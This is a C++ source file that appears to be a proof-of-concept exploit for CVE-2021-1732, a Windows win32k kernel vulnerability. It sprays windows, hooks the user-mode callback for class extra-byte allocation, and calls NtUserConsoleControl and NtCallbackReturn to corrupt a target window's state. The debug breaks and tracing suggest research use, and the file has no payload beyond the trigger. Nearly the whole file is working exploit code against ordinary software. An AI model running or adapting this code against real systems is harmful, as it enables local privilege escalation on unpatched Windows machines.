// CVE-2021-1732.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <HookLib.h>

#pragma comment(lib, "Zydis.lib")
#pragma comment(lib, "HookLib.lib")

#define CLS_NAME	L"PO_WND_CLS"

#define WND_NAME L"PO_WND"

#define CALLBACK_INDEX		0x7B

using USERMODECALLBACK = VOID(WINAPI*)( ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4 );
USERMODECALLBACK UserModeCallback_Orig = NULL;

using NTUSERCONSOLECONTROL = NTSTATUS(WINAPI*)(ULONG_PTR CtrlCode, PVOID CtrlInfo, ULONG_PTR CtrlInfoLen);
NTUSERCONSOLECONTROL NtUserConsoleControl = NULL;


using  NTCALLBACKRETURN = NTSTATUS (WINAPI*)( IN PVOID OutputBuffer, IN ULONG OutputLength, IN NTSTATUS Status );
NTCALLBACKRETURN NtCallbackReturn;

#define SPRAY_WND_COUNT			0x200
HWND SprayWndHandles[SPRAY_WND_COUNT];

VOID WINAPI UserModeCallback_Proxy(ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4)
{
	ULONG_PTR ulConsoleInfo[0x2] = { 0 };
	ULONG_PTR ulRetBuffer[0x3] = { 0 };
	ULONG ulCurWnd = (ULONG)SprayWndHandles[SPRAY_WND_COUNT / 2];
	USHORT usHigh = (ulCurWnd >> 0x10) & 0xffff;
	USHORT usLow = ulCurWnd & 0xffff;
	ulCurWnd = ((usHigh + 1) << 0x10) | usLow;

	printf("UserMode Callback: %llx %llx %llx %llx\n", Para1, Para2, Para3, Para4 );
	printf( "Current window is Handle %X\n",  ulCurWnd);

	__debugbreak();

	ulConsoleInfo[0] = ulCurWnd;
	NtUserConsoleControl(0x6, (PVOID)&ulConsoleInfo, sizeof(ulConsoleInfo));

	ulRetBuffer[0] = 0x100;
	NtCallbackReturn(&ulRetBuffer, sizeof(ulRetBuffer), 0x0);


	// hook: call origin function, in this case, don't need, due to USER32!_xxxClientAllocWindowClassExtraBytes's internal call NtCallbackReturn
	//UserModeCallback_Orig(Para1, Para2, Para3, Para4);
}

BOOL RegistWndClass( PCTSTR ClsName ) {
	WNDCLASS wc = { 0 };

	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = ClsName;
	wc.cbWndExtra = 0x20;					// must specify, otherwise can't triggle xxxClientAllocWindowClassExtraBytes 
	return !!RegisterClass(&wc);
}

HWND CreateWnd( PCTSTR ClsName ) {
	return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, GetModuleHandle(NULL), NULL);
}

int main()
{
	HMODULE hWin32uMod = LoadLibrary(TEXT("win32u.dll"));
	HMODULE hWinNtdllMod = LoadLibrary(TEXT("ntdll.dll"));
	ULONG_PTR ulPebAddr = __readgsqword(0x60);
	PULONG_PTR pUserModeCallbackTable = *(PULONG_PTR*)(ulPebAddr + 0x58);

	__debugbreak();

	NtUserConsoleControl = (NTUSERCONSOLECONTROL)GetProcAddress(hWin32uMod, "NtUserConsoleControl");
	NtCallbackReturn = (NTCALLBACKRETURN)GetProcAddress(hWinNtdllMod, "NtCallbackReturn");

	if (RegistWndClass(CLS_NAME) ) {
		for (int i = 0; i < SPRAY_WND_COUNT; i++) {
			SprayWndHandles[i] = CreateWnd(CLS_NAME);
		}
		printf("SprayWndHandles[%x] == %X \n", SPRAY_WND_COUNT / 2, SprayWndHandles[SPRAY_WND_COUNT / 2]);
		DestroyWindow(SprayWndHandles[SPRAY_WND_COUNT/2]);
		SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast<PVOID*>(&UserModeCallback_Orig));
		HWND hTargetWnd = CreateWnd(CLS_NAME);
		printf("hTargetWnd == %X\n", hTargetWnd);
	}
}